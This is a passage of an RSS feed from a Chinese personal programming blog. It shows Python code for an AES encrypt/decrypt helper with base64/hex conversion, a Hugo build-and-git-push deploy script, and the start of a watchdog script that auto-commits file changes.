        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">model</span> <span class="o">==</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">aes</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">key</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">model</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">iv</span><span class="p">)</span> 
        <span class="k">elif</span> <span class="bp">self</span><span class="o">.</span><span class="n">model</span> <span class="o">==</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_ECB</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">aes</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">key</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">model</span><span class="p">)</span> 
        <span class="bp">self</span><span class="o">.</span><span class="n">encrypt_text</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">aes</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">encrypt_text</span>

    <span class="k">def</span> <span class="nf">aesdecrypt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">text</span><span class="p">):</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">model</span> <span class="o">==</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">aes</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">key</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">model</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">iv</span><span class="p">)</span> 
        <span class="k">elif</span> <span class="bp">self</span><span class="o">.</span><span class="n">model</span> <span class="o">==</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_ECB</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">aes</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">key</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">model</span><span class="p">)</span> 
        <span class="bp">self</span><span class="o">.</span><span class="n">decrypt_text</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">aes</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">decrypt_text</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">decrypt_text</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">decrypt_text</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">passwd</span> <span class="o">=</span> <span class="s2">&#34;123456781234567&#34;</span>
    <span class="n">iv</span> <span class="o">=</span> <span class="s1">&#39;1234567812345678&#39;</span>

    <span class="n">aescryptor</span> <span class="o">=</span> <span class="n">Aescrypt</span><span class="p">(</span><span class="n">passwd</span><span class="p">,</span><span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span><span class="n">iv</span><span class="p">)</span> <span class="c1"># CBC模式</span>
    <span class="c1"># aescryptor = Aescrypt(passwd,AES.MODE_ECB,&#34;&#34;) # ECB模式</span>
    <span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;好好学习&#34;</span>
    <span class="n">en_text</span> <span class="o">=</span> <span class="n">aescryptor</span><span class="o">.</span><span class="n">aesencrypt</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;密文:&#34;</span><span class="p">,</span><span class="n">en_text</span><span class="p">)</span>
    <span class="n">text</span> <span class="o">=</span> <span class="n">aescryptor</span><span class="o">.</span><span class="n">aesdecrypt</span><span class="p">(</span><span class="n">en_text</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;明文:&#34;</span><span class="p">,</span><span class="n">text</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>上面这段代码 你输入的 所有参数都应该是字符串或者 字节型数据, 并且输出的都是 字节型数据</p>
<p>如果进行一些编码转换可以在类的外部进行完成, 这里我就不写了, 到这里我才真正的明白为什么 python自己不封装一下这个算法, 确实可能的情况太多了, 这样还是比较灵活的。(其实进一步封装也是可以的, 就是判断输入的是base64字符串,还是hexstr,或者bytes, 然后在自定义一下输出,不过我是懒得弄了)</p>
<p>另外附上 base64 编码解码 和 hexstr 编码解码</p>
<h2 id="编码解码">编码解码</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;hello&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;base64编码:&#34;</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;base64解码:&#34;</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">b2a_hex</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;hexstr编码:&#34;</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">a2b_hex</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;hexstr解码:&#34;</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>如果你真的认真的读了我的这篇文章, 我相信你肯定解决了你的问题, 如果不是这样可以评论区提出</p>]]></description>
</item><item>
    <title>Python部署推送</title>
    <link>https://www.bysec.cn/20170601/</link>
    <pubDate>Thu, 01 Jun 2017 00:00:00 &#43;0000</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/20170601/</guid>
    <description><![CDATA[<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="c1"># -*- coding: utf-8 -*-</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">chardet</span>
<span class="kn">import</span> <span class="nn">subprocess</span>


<span class="k">def</span> <span class="nf">convert</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">out_enc</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">content_bytes</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

        <span class="n">source_encoding</span> <span class="o">=</span> <span class="n">chardet</span><span class="o">.</span><span class="n">detect</span><span class="p">(</span><span class="n">content_bytes</span><span class="p">)</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;encoding&#39;</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">chardet</span><span class="o">.</span><span class="n">detect</span><span class="p">(</span><span class="n">content_bytes</span><span class="p">))</span>

        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="n">source_encoding</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">content_str</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="n">out_enc</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">content_str</span><span class="p">)</span>

        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">content_bb</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

    <span class="k">except</span> <span class="ne">IOError</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;I/O error:</span><span class="si">{0}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">err</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">explore</span><span class="p">(</span><span class="nb">dir</span><span class="p">,</span> <span class="n">suffix</span><span class="p">,</span> <span class="n">out_enc</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">root</span><span class="p">,</span> <span class="n">dirs</span><span class="p">,</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">walk</span><span class="p">(</span><span class="nb">dir</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">file</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">splitext</span><span class="p">(</span><span class="n">file</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">suffix</span><span class="p">:</span>
                <span class="nb">print</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
                <span class="n">path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="n">file</span><span class="p">)</span>
                <span class="n">convert</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">out_enc</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">exe</span><span class="p">():</span>
    <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="s2">&#34;hugo&#34;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
    <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s2">&#34;git add .&#34;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
    <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s2">&#34;git commit -m </span><span class="se">\&#34;</span><span class="s2">main</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
    <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s2">&#34;git push&#34;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
    <span class="n">explore</span><span class="p">(</span><span class="s2">&#34;public&#34;</span><span class="p">,</span> <span class="s2">&#34;.md&#34;</span><span class="p">,</span> <span class="s2">&#34;utf-8-sig&#34;</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="s1">&#39;public&#39;</span><span class="p">)</span> 
    <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s2">&#34;git add .&#34;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
    <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s2">&#34;git commit -m </span><span class="se">\&#34;</span><span class="s2">main</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
    <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s2">&#34;git push&#34;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">py</span><span class="p">():</span>
    <span class="c1"># 推送到 Hugo 仓库</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="o">*</span><span class="mi">80</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;hugo&#39;</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;git add .&#39;</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;git commit -m </span><span class="se">\&#34;</span><span class="s1">main</span><span class="se">\&#34;</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;git push&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="o">*</span><span class="mi">80</span><span class="p">)</span>
    <span class="c1"># 批量修改文档编码</span>
    <span class="n">explore</span><span class="p">(</span><span class="s2">&#34;public&#34;</span><span class="p">,</span> <span class="s2">&#34;.md&#34;</span><span class="p">,</span> <span class="s2">&#34;utf-8-sig&#34;</span><span class="p">)</span>
    <span class="c1"># 推送到 CNbysec.github.io 仓库</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="o">*</span><span class="mi">80</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="s1">&#39;public&#39;</span><span class="p">)</span> 
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;git add .&#39;</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;git commit -m </span><span class="se">\&#34;</span><span class="s1">main</span><span class="se">\&#34;</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;git push&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="o">*</span><span class="mi">80</span><span class="p">)</span>
    <span class="c1"># 本地部署</span>
    <span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="s1">&#39;../&#39;</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;hugo server&#39;</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="c1"># exe()</span>
    <span class="n">py</span><span class="p">()</span>

</code></pre></td></tr></table>
</div>
</div>]]></description>
</item><item>
    <title>Python实现自动推送到仓库</title>
    <link>https://www.bysec.cn/20170501/</link>
    <pubDate>Mon, 01 May 2017 00:00:00 &#43;0000</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/20170501/</guid>
    <description><![CDATA[<h2 id="实现自动推送到仓库">实现自动推送到仓库</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="c1"># -*- coding:utf-8 -*-</span>

<span class="kn">from</span> <span class="nn">watchdog.observers</span> <span class="kn">import</span> <span class="n">Observer</span>
<span class="kn">from</span> <span class="nn">watchdog.events</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">os</span>


<span class="k">def</span> <span class="nf">push</span><span class="p">(</span><span class="n">change</span><span class="p">):</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="o">*</span><span class="mi">76</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;git add .&#39;</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;git commit -m</span><span class="se">\&#34;</span><span class="s1">auto&#39;</span><span class="o">+</span><span class="n">change</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\&#34;</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;git push -u origin master&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="o">*</span><span class="mi">76</span><span class="p">)</span>


<span class="k">class</span> <span class="nc">FileEventHandler</span><span class="p">(</span><span class="n">FileSystemEventHandler</span><span class="p">):</span>
    <span class="c1"># 初始化魔术方法</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">FileSystemEventHandler</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>

    <span class="c1"># 文件或文件夹移动</span>
    <span class="k">def</span> <span class="nf">on_moved</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">event</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">event</span><span class="o">.</span><span class="n">is_directory</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;directory moved from </span><span class="si">{0}</span><span class="s2"> to </span><span class="si">{1}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">event</span><span class="o">.</span><span class="n">src_path</span><span class="p">,</span> <span class="n">event</span><span class="o">.</span><span class="n">dest_path</span><span class="p">))</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;file moved from </span><span class="si">{0}</span><span class="s2"> to </span><span class="si">{1}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">event</span><span class="o">.</span><span class="n">src_path</span><span class="p">,</span> <span class="n">event</span><span class="o">.</span><span class="n">dest_path</span><span class="p">))</span>
            <span class="c1"># 这里我们只判断文件修改,如需加入文件夹修改,只需在上面的if条件中调用push函数即可</span>
            <span class="n">push</span><span class="p">(</span><span class="s2">&#34;文件移动: </span><span class="si">{0}</span><span class="s2"> to </span><span class="si">{1}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">event</span><span class="o">.</span><span class="n">src_path</span><span class="p">,</span> <span class="n">event</span><span class="o">.</span><span class="n">dest_path</span><span class="p">))</span>

    <span class="c1"># 创建文件或文件夹</span>
    <span class="k">def</span> <span class="nf">on_created</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">event</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">event</span><span class="o">.</span><span class="n">is_directory</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;directory created:</span><span class="si">{0}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">event</span><span class="o">.</span><span class="n">src_path</span><span class="p">))</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;file created:</span><span class="si">{0}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">event</span><span class="o">.</span><span class="n">src_path</span><span class="p">))</span>
            <span class="n">push</span><span class="p">(</span><span class="s2">&#34;创建文件:</span><span class="si">{0}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">event</span><span class="o">.</span><span class="n">src_path</span><span class="p">))</span>

    <span class="c1"># 删除文件或文件夹</span>
    <span class="k">def</span> <span class="nf">on_deleted</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">event</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">event</span><span class="o">.</span><span class="n">is_directory</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;directory deleted:</span><span class="si">{0}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">event</span><span class="o">.</span><span class="n">src_path</span><span class="p">))</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;file deleted:</span><span class="si">{0}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">event</span><span class="o">.</span><span class="n">src_path</span><span class="p">))</span>
            <span class="n">push</span><span class="p">(</span><span class="s2">&#34;删除文件:</span><span class="si">{0}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">event</span><span class="o">.</span><span class="n">src_path</span><span class="p">))</span>

    <span class="c1"># 移动文件或文件夹</span>
    <span class="k">def</span> <span class="nf">on_modified</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">event</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">event</span><span class="o">.</span><span class="n">is_directory</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;directory modified:</span><span class="si">{0}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">event</span><span class="o">.</span><span class="n">src_path</span><span class="p">))</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;file modified:</span><span class="si">{0}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">event</span><span class="o">.</span><span class="n">src_path</span><span class="p">))</span>
